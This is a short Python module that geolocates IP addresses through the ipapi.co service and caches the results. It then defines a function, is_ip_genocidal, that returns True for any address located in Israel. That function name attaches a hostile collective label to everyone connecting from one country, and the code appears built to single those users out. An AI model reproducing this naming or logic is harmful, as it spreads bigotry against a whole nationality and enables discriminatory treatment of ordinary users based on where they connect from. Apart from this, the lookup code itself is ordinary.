import asyncio
import httpx
import ipaddress
from typing import Dict, Optional

# Global cache for IP -> country mappings
_ip_country_cache: Dict[str, Optional[str]] = {}

async def get_ip_country(ip: str) -> Optional[str]:
    """Get country code for IP address using ipapi.co, with caching.

    Returns country code (e.g., 'IL') or None if failed.
    """
    # Validate IP address format
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        _ip_country_cache[ip] = None
        return None

    if ip in _ip_country_cache:
        return _ip_country_cache[ip]
    
    try:
        async with httpx.AsyncClient(timeout=5.0) as client:
            response = await client.get(f"https://ipapi.co/{ip}/country/")
            if response.status_code == 200:
                country = response.text.strip().upper()
                _ip_country_cache[ip] = country
                return country
            else:
                _ip_country_cache[ip] = None
                return None
    except Exception:
        _ip_country_cache[ip] = None
        return None

def is_ip_genocidal(ip: str) -> bool:
    """Check if IP is from Israel. Only safe to call outside a running event loop."""
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            return False
        return loop.run_until_complete(get_ip_country(ip)) == 'IL'
    except Exception:
        return False
